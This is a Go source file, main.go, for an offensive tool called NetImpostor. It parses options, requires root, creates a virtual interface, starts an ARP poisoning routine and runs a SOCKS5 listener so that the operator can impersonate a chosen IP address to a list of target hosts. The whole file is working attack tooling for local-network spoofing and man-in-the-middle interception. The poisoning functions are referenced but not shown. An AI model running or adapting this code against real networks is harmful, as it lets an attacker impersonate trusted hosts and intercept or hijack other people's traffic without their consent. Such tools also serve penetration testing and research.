package main

import (
	"errors"
	"fmt"
	"github.com/jessevdk/go-flags"
	"net"
	"net/netip"
	"os"
	"slices"
)

const DEFAULT_ARP_TIMEOUT = 2
const DEFAULT_POISON_INTERVAL = 10
const DEFAULT_LHOST = "127.0.0.1"
const DEFAULT_LPORT = 1080

var OPTIONS struct {
	LHOST string `long:"lhost" description:"Local address to listen for connections [default: 127.0.0.1]" required:"false"`
	LPORT int    `long:"lport" description:"Local port to listen for connections [default: 1080]" required:"false"`

	INTERFACE   string `short:"i" long:"interface" description:"Local interface" required:"true"`
	HARDWADDR   string `long:"mac" description:"Hardware address for arp poison [default: address of the -i interface. for virtual machines: **MIGHT** need to be address of the host that runs the machine, not its own interface]" required:"false"`
	IMPERSONATE string `long:"impersonate" description:"Remote address to impersonate" required:"true"`
	TARGETS     string `short:"t" long:"targets" description:"Comma seperated list of IPs that NetImpostor impersonates against" required:"true"`

	ARP_TIMEOUT     int `long:"arpt" description:"Timeout for ARP resolve requests [seconds] [default: 2]" required:"false"`
	POISON_INTERVAL int `long:"pi" description:"Interval between ARP poison iterations [seconds] [default: 10]" required:"false"`

	VERBOSE bool `short:"v" long:"verbose" description:"Show verbose debug information"`
	QUITE   bool `short:"q" long:"quite" description:"Quite mode. [overrides verbose]"`
	CLEANUP bool `short:"c" long:"clean" description:"Clean up NetImpostor configurations"`
}
var TARGET_IPS []netip.Addr

func main() {
	fmt.Println("-----------------\nNetImpostor\nBy tastypepperoni\n-----------------")
	if os.Geteuid() != 0 {
		LogStatus(MODE_MAIN, "NetImpostor must be run as root", true, false)
		os.Exit(1)
	}
	if err := Init(); err != nil {
		LogStatus(MODE_MAIN, err.Error(), true, false)
		return
	}

	fmt.Println("[===========================] SETUP [===========================]")
	fmt.Printf("[+] SOCKS5 Proxy Address: %s:%d\n", OPTIONS.LHOST, OPTIONS.LPORT)
	fmt.Printf("[+] Impersonating: %s\n", OPTIONS.IMPERSONATE)
	fmt.Printf("[+] Targeting: %s\n", OPTIONS.TARGETS)
	fmt.Println("[===============================================================]")

	LogStatus(MODE_POISON, "loading poison targets", false, true)
	if err := LoadPoisonTargets(TARGET_IPS); err != nil {
		LogStatus(MODE_POISON, fmt.Sprintf("failed to load poison module: %s", err), true, false)
		return
	}

	LogStatus(MODE_POISON, "starting ARP poison module", false, true)
	go Poison()

	LogStatus(MODE_POISON, "starting SOCKS5 spoof module", false, true)
	listener, err := net.ListenTCP("tcp", &net.TCPAddr{
		IP:   net.ParseIP(OPTIONS.LHOST),
		Port: OPTIONS.LPORT,
	})
	if err != nil {
		LogStatus(MODE_MAIN, fmt.Sprintf("failed to set up local listener at %s:%d: %v", OPTIONS.LHOST, OPTIONS.LPORT, err), true, false)
		return
	}
	defer func() {
		err = listener.Close()
		if err != nil {
			LogStatus(MODE_MAIN, fmt.Sprintf("failed to close listener: %s:%d", OPTIONS.LHOST, OPTIONS.LPORT), true, false)
		}
	}()
	for {
		conn, err := listener.AcceptTCP()
		if err != nil {
			LogStatus(MODE_MAIN, fmt.Sprintf("error accepting connection"), true, false)
			continue
		}
		go handleRequest(conn)
	}
}

func Init() error {
	_, err := flags.ParseArgs(&OPTIONS, os.Args)
	CleanUp()
	LogStatus(MODE_MAIN, "performed cleanup operations", false, false)
	if OPTIONS.CLEANUP {
		os.Exit(0)
	}
	if err != nil {
		if !slices.Contains(os.Args, "-h") && !slices.Contains(os.Args, "--help") {
			return errors.New(fmt.Sprintf("invalid args. %s", fmt.Sprintf("%s -h", os.Args[0])))
		}
		os.Exit(0)
	}
	if !validateArgs() {
		return errors.New("failed to validate argument")
	}
	SetUpVirtualIf()
	LogStatus(MODE_MAIN, fmt.Sprintf("set up virtual interface %s@%s", DEFAULT_MACVLAN_NAME, OPTIONS.INTERFACE), false, true)

	if OPTIONS.ARP_TIMEOUT == 0 {
		OPTIONS.ARP_TIMEOUT = DEFAULT_ARP_TIMEOUT
	}
	if OPTIONS.POISON_INTERVAL == 0 {
		OPTIONS.POISON_INTERVAL = DEFAULT_POISON_INTERVAL
	}
	IMPERSONATE_IP, _ = netip.ParseAddr(OPTIONS.IMPERSONATE)
	if OPTIONS.HARDWADDR == "" {
		iface, _ := net.InterfaceByName(OPTIONS.INTERFACE)
		LOCAL_HARDWARE_ADDR = iface.HardwareAddr
	} else {
		LOCAL_HARDWARE_ADDR, _ = net.ParseMAC(OPTIONS.HARDWADDR)
	}
	return nil
}
